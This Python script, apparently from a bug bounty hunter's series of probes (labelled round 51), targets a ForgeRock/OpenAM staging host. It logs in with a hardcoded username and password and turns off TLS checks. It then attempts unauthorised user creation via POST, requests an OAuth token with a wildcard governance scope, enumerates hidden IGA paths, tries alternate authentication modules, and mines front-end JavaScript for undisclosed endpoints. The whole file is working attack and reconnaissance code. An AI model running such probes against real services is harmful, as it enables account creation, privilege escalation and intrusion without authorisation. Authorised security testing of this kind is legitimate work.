# -*- coding: utf-8 -*-
"""AIC 第五十一轮:POST users 创建 / IGA 顶层路径 / authIndexType 变体
上轮:根 realm 全封闭(独立用户库、无树、oauth2 空)。
本轮:
A. POST /am/json/realms/root/realms/alpha/users 无 _action(直接创建用户!)
B. IGA 顶层路径枚举(governance 之外:access/v1/api/requests 等)
C. authIndexType 变体(module/composite/certificate/resource)在 alpha realm
D. enduser 页面 JS 考古(拿 SPA 入口 JS,找 API 调用)
预期结果表:
  成立 -> POST users 201/200 创建成功;IGA 新路径非 404;module 认证开放;JS 里有隐藏端点
"""
import requests, urllib3, json, time, re
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': 'aa942d46ece12ce=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

print('\n=== A. POST users 直接创建 ===')
U = BASE + '/am/json/realms/root/realms/alpha/users'
bodies = [
    {'userName': 'postuser4651', 'givenName': ['Post'], 'sn': ['User'], 'mail': ['postuser4651@example.com'],
     'userpassword': 'PostUser4651!x'},
    {'username': 'postuser4652', 'userpassword': 'PostUser4652!x'},
]
for b in bodies:
    try:
        r = S.post(U, json=b, timeout=12, verify=False)
        print('POST users %-50s -> %d %s' % (str(b)[:50], r.status_code, r.text[:160].replace('\n', ' ')))
    except Exception as e:
        print('POST users -> ERR %s' % str(e)[:60])
    time.sleep(0.4)

print('\n=== B. IGA 顶层路径枚举 ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
    '&redirect_uri=%s&scope=%s&state=t' % (quote('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html', safe=''),
                                           quote('openid fr:iga:*', safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
if 'code=' in loc:
    code = loc.split('code=')[1].split('&')[0]
    r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                data={'grant_type': 'authorization_code', 'code': code,
                      'redirect_uri': 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html',
                      'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    at = r2.json().get('access_token')
    H = {'Authorization': 'Bearer ' + at, 'Accept-API-Version': 'resource=2.1, protocol=1.0'}
    for path in ['/iga/', '/iga/access', '/iga/v1', '/iga/api', '/iga/requests',
                 '/iga/governance', '/iga/governance/', '/iga/governance/me',
                 '/iga/governance/access-requests', '/iga/governance/applications',
                 '/iga/governance/roles', '/iga/governance/approvals',
                 '/iga/governance/user/%s' % MY_ID]:
        try:
            r = S.get(BASE + path, headers=H, timeout=12, verify=False)
            print('%-45s -> %d %s' % (path, r.status_code, r.text[:90].replace('\n', ' ')))
        except Exception as e:
            print('%-45s -> ERR %s' % (path, str(e)[:50]))
        time.sleep(0.3)

print('\n=== C. authIndexType 变体 ===')
for t, v in [('module', 'LDAP'), ('module', 'DataStore'), ('module', 'AD'),
             ('composite', 'Login'), ('certificate', 'x509'), ('resource', 'enduser')]:
    try:
        r = S.post(BASE + '/am/json/realms/alpha/authenticate?authIndexType=' + t + '&authIndexValue=' + v,
                   json={}, timeout=12, verify=False)
        d = r.json()
        cbs = [cb.get('type') for cb in d.get('callbacks', [])]
        print('authIndexType=%-11s val=%-10s -> %d authId=%s callbacks=%s' % (
            t, v, r.status_code, bool(d.get('authId')), cbs))
    except Exception as e:
        print('authIndexType=%-11s val=%-10s -> ERR %s' % (t, v, str(e)[:50]))
    time.sleep(0.3)

print('\n=== D. enduser SPA JS 考古 ===')
for js in ['/enduser/main.js', '/enduser/app.js', '/enduser/index.js', '/enduser/runtime.js',
           '/enduser/scripts/app.js', '/enduser/js/main.js']:
    try:
        r = S.get(BASE + js, timeout=12, verify=False)
        print('%-28s -> %d len=%d' % (js, r.status_code, len(r.text)))
        if r.status_code == 200 and len(r.text) > 100:
            hits = set(re.findall(r'["\'](/am/[\w/{}.:?=&$-]*)["\']', r.text)) | \
                   set(re.findall(r'["\'](/openidm/[\w/{}.:?=&$-]*)["\']', r.text)) | \
                   set(re.findall(r'["\'](/iga/[\w/{}.:?=&$-]*)["\']', r.text))
            for h in sorted(hits)[:40]:
                print('   JS引用: %s' % h)
            break
    except Exception as e:
        print('%-28s -> ERR %s' % (js, str(e)[:50]))
    time.sleep(0.3)
